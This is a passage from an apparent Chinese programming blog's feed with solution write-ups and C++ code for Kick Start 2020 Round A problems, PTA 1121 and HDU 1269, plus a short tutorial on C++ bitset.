&#123;</span><br><span class="line">                sum[i][j] = sum[i][j - <span class="number">1</span>] + a[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= k; ++i) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][i] = sum[<span class="number">1</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i * k; ++j) &#123;  <span class="comment">// 我这里多算了，实际上到 p 就行了</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> l = <span class="number">0</span>; l &lt;= min(j, k); ++l) &#123;</span><br><span class="line">                    dp[i][j] = max(dp[i][j], dp[i - <span class="number">1</span>][j - l] + sum[i][l]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[n][p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Workout"><a href="#C-Workout" class="headerlink" title="C. Workout"></a>C. Workout</h2><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7/00000000001d3f5b" target="_blank" rel="noopener">题目链接</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><p>给定 $N$ 个严格递增的数，往这 $N$ 个数中间插 $K$ 个数，插入后要使所有的数仍然保持严格递增，而且要保证相邻两数的最大绝对值之差最小，求最小的绝对值之差。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我一开始想的是贪心+优先队列，先计算所有相邻两数的差值并加入到优先队列中，然后每次取出队首 $x$，将它分成 $x / 2$ 和 $x - x / 2$ 两部分，并将这两部分加入到优先队列中，操作 $K$ 次后的队首就是答案。提交后小数据过了，大数据 $WA$ 了。仔细一看小数据是 $K=1$。然后找到了反例，如 $K=4$，原数组是 $[10, 20]$，那么正确结果是 $[10, 12, 14, 16, 18, 20]$，而采用本方法得到的结果是 $[10, 12, 13, 15, 17, 20]$。</p><p>最后用的是二分答案过的，典型的最大值最小的问题。判断函数的思路：传入参数 $x$，表示答案为 $x$，然后遍历每个数 $num[i]$，如果 $num[i + 1] - num[i] &gt; x$，就插入 $num[i] + x$，如果插入的数的个数大于 $K$ 个就返回 $false$，否则返回 $true$。</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line">ll m[maxn];</span><br><span class="line">ll tmp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">while</span>(tmp[i + <span class="number">1</span>] - tmp[i] &gt; x) &#123;</span><br><span class="line">            tmp[i] += x;</span><br><span class="line">            ++cnt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt &gt; k) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">int</span> kase = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; m[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; ++kase &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">1</span>, r = inf;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">                tmp[i] = m[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(judge(mid)) &#123;</span><br><span class="line">                r = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; r &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Bundling"><a href="#D-Bundling" class="headerlink" title="D. Bundling"></a>D. Bundling</h2><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7/00000000001d3ff3" target="_blank" rel="noopener">题目链接</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><p>给定 $N$ 个字符串，把它们分组，每组 $K$ 个。每组的分数是该组所有字符串的最长公共前缀。求最大的所有组的分数和。</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>很容易想到前缀树 (字典树 / trie 树)，建完树后从根节点 $dfs$，同时记录深度 $d$，然后从叶子节点回溯，统计每个节点出现的个数 $cnt$，如果某个节点 $u$ 的 $cnt[u] ≥ K$，那么说明有 $K$ 个字符串的前缀是以该节点结尾，深度 $d$ 表示它们的前缀的长度，由于是从叶子节点回溯的，所以一定是最长公共前缀，所以 $ans = ans + d$，同时 $cnt[u]$ 减去 $k$，即这 $k$ 个字符串已经分完组，不再分到其他组。</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> trie[maxn &lt;&lt; <span class="number">2</span>][<span class="number">30</span>], tot = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> cnt[maxn &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line">ll ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(trie, <span class="number">0</span>, <span class="keyword">sizeof</span>(trie));</span><br><span class="line">    <span class="built_in">memset</span>(cnt, <span class="number">0</span>, <span class="keyword">sizeof</span>(cnt));</span><br><span class="line">    tot = <span class="number">1</span>;</span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> ch: s) &#123;</span><br><span class="line">        <span class="keyword">int</span> id = ch - <span class="string">'A'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!trie[p][id]) &#123;</span><br><span class="line">            trie[p][id] = tot++;</span><br><span class="line">        &#125;</span><br><span class="line">        p = trie[p][id];</span><br><span class="line">    &#125;</span><br><span class="line">    ++cnt[p];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; <span class="number">26</span>; ++v) &#123;</span><br><span class="line">        <span class="keyword">if</span>(trie[u][v]) &#123;</span><br><span class="line">            dfs(trie[u][v], d + <span class="number">1</span>);</span><br><span class="line">            cnt[u] += cnt[trie[u][v]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(cnt[u] &gt;= k) &#123;</span><br><span class="line">        cnt[u] -= k;</span><br><span class="line">        ans += d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">int</span> kase = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        init();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; ++kase &lt;&lt; <span class="string">": "</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">string</span> s;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">            insert(s);</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛链接：&lt;a href=&quot;https://codingcompetitions.withgoogle.com/kickstart/round/000000000019ffc7&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kick start Round A 2020&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="动态规划" scheme="http://wutao18.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
      <category term="贪心" scheme="http://wutao18.github.io/tags/%E8%B4%AA%E5%BF%83/"/>
    
      <category term="DFS" scheme="http://wutao18.github.io/tags/DFS/"/>
    
      <category term="二分" scheme="http://wutao18.github.io/tags/%E4%BA%8C%E5%88%86/"/>
    
      <category term="排序" scheme="http://wutao18.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
      <category term="前缀和" scheme="http://wutao18.github.io/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
      <category term="Trie/字典树/前缀树" scheme="http://wutao18.github.io/tags/Trie-%E5%AD%97%E5%85%B8%E6%A0%91-%E5%89%8D%E7%BC%80%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>C++ bitset的使用</title>
    <link href="http://wutao18.github.io/2019/11/23/C-bitset%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://wutao18.github.io/2019/11/23/C-bitset%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2019-11-23T14:08:50.000Z</published>
    <updated>2020-10-27T03:27:07.740Z</updated>
    
    <content type="html"><![CDATA[<p>bitset 一般代替 bool 数组使用，常用于优化空间，因为 bitset 中一个元素只占 1 bit。</p><a id="more"></a><p>bitset 的大小在定义使就需要确定。如果想要不定长的 bitset，就需要使用 vector<bool>。</p><p>bitset 的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bitset</span>&lt;16&gt; bt;  <span class="comment">// 定义大小为16的bitset，每一位都是0</span></span><br><span class="line"><span class="function"><span class="built_in">bitset</span>&lt;16&gt; <span class="title">bt</span><span class="params">(<span class="built_in">string</span>(<span class="string">"11001"</span>))</span></span>;  <span class="comment">// 定义大小为16的bitset，并用string初始化，注意高位为0，也就是 0000000000011001</span></span><br></pre></td></tr></table></figure><p>bitset 可以直接使用 cin 和 cout 输入输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bitset</span>&lt;16&gt; bt;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; bt;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; bt &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p>bitset 可以像数组一样访问或修改某一位置的元素，注意0表示低位。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bitset</span>&lt;8&gt; bt;</span><br><span class="line">bt[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">// 00000001</span></span><br></pre></td></tr></table></figure><p>bitset 也可以像一个数一样进行位运算：与(&amp;)、或(|)、异或(^)、取反(~)、左移(&lt;&lt;)、右移(&gt;&gt;)。</p><p>常用函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bitset</span>&lt;8&gt; bt;</span><br><span class="line">bt.size(); <span class="comment">// 返回大小</span></span><br><span class="line">bt.count(); <span class="comment">// 返回1的个数</span></span><br><span class="line">bt.<span class="built_in">set</span>(); <span class="comment">// 全部置1</span></span><br><span class="line">bt.<span class="built_in">set</span>(pos);  <span class="comment">// pos位置1</span></span><br><span class="line">bt.reset();  <span class="comment">// 全部置0</span></span><br><span class="line">bt.reset(pos);  <span class="comment">// pos位置0</span></span><br><span class="line">bt.flip(); <span class="comment">// 全部取反</span></span><br><span class="line">bt.flip(pos); <span class="comment">// pos位取反</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;bitset 一般代替 bool 数组使用，常用于优化空间，因为 bitset 中一个元素只占 1 bit。&lt;/p&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="STL" scheme="http://wutao18.github.io/tags/STL/"/>
    
      <category term="编程语言" scheme="http://wutao18.github.io/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="C++" scheme="http://wutao18.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>PTA 1121 Damn Single</title>
    <link href="http://wutao18.github.io/2019/11/22/PTA-1121-Damn-Single/"/>
    <id>http://wutao18.github.io/2019/11/22/PTA-1121-Damn-Single/</id>
    <published>2019-11-22T15:34:17.000Z</published>
    <updated>2020-10-27T04:01:02.767Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://pintia.cn/problem-sets/994805342720868352/problems/994805352359378944" target="_blank" rel="noopener">1121 Damn Single (25 分)</a></p><blockquote><p>“Damn Single (单身狗)” is the Chinese nickname for someone who is being single. You are supposed to find those who are alone in a big party, so they can be taken care of.</p></blockquote><a id="more"></a><h2 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h2><blockquote><p>Each input file contains one test case. For each case, the first line gives a positive integer N (≤ 50,000), the total number of couples. Then N lines of the couples follow, each gives a couple of ID’s which are 5-digit numbers (i.e. from 00000 to 99999). After the list of couples, there is a positive integer M (≤ 10,000) followed by M ID’s of the party guests. The numbers are separated by spaces. It is guaranteed that nobody is having bigamous marriage (重婚) or dangling with more than one companion.</p></blockquote><h2 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h2><blockquote><p>First print in a line the total number of lonely guests. Then in the next line, print their ID’s in increasing order. The numbers must be separated by exactly 1 space, and there must be no extra space at the end of the line.</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">11111 22222</span><br><span class="line">33333 44444</span><br><span class="line">55555 66666</span><br><span class="line">7</span><br><span class="line">55555 44444 10000 88888 22222 11111 23333</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">10000 23333 44444 55555 88888</span><br></pre></td></tr></table></figure><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>给定情侣关系，然后给出一次宴会上出席的人，问这些人中有多少单身狗 (伴侣没来的也算)。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>记录情侣关系，然后找出出席的人中不在情侣关系中的人以及伴侣没有来的人即可。</p><p>注意输出要补零，最后一行不用换行。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> couple[maxn] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line">        couple[x] = y;</span><br><span class="line">        couple[y] = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; party;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">        party.push_back(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = couple[party[i]];</span><br><span class="line">        <span class="keyword">if</span>(tmp == <span class="number">-1</span>) &#123;</span><br><span class="line">            ans.insert(party[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(find(party.begin(), party.end(), tmp) == party.end()) &#123;</span><br><span class="line">                ans.insert(party[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans.size() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = ans.begin(); it != ans.end(); ++it) &#123;</span><br><span class="line">        <span class="keyword">if</span>(it != ans.begin()) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%05d"</span>, *it);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;https://pintia.cn/problem-sets/994805342720868352/problems/994805352359378944&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;1121 Damn Single (25 分)&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“Damn Single (单身狗)” is the Chinese nickname for someone who is being single. You are supposed to find those who are alone in a big party, so they can be taken care of.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="STL" scheme="http://wutao18.github.io/tags/STL/"/>
    
  </entry>
  
  <entry>
    <title>HDU 1269 迷宫城堡 (Kosaraju)</title>
    <link href="http://wutao18.github.io/2019/11/21/HDU-1269-%E8%BF%B7%E5%AE%AB%E5%9F%8E%E5%A0%A1-Kosaraju/"/>
    <id>http://wutao18.github.io/2019/11/21/HDU-1269-%E8%BF%B7%E5%AE%AB%E5%9F%8E%E5%A0%A1-Kosaraju/</id>
    <published>2019-11-21T14:30:56.000Z</published>
    <updated>2020-10-27T03:29:25.800Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1269" target="_blank" rel="noopener">HDU 1269</a></p><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>为了训练小希的方向感，Gardon建立了一座大城堡，里面有N个房间(N&lt;=10000)和M条通道(M&lt;=100000)，每个通道都是单向的，就是说若称某通道连通了A房间和B房间，只说明可以通过这个通道由A房间到达B房间，但并不说明通过它可以由B房间到达A房间。Gardon需要请你写个程序确认一下是否任意两个房间都是相互连通的，即：对于任意的i和j，至少存在一条路径可以从房间i到房间j，也存在一条路径可以从房间j到房间i。</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>输入包含多组数据，输入的第一行有两个数：N和M，接下来的M行每行有两个数a和b，表示了一条通道可以从A房间来到B房间。文件最后以两个0结束。</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>对于输入的每组数据，如果任意两个房间都是相互连接的，输出”Yes”，否则输出”No”。</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3 3</span><br><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">3 1</span><br><span class="line">3 3</span><br><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">3 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Yes</span><br><span class="line">No</span><br></pre></td></tr></table></figure><h2 id="Source"><a 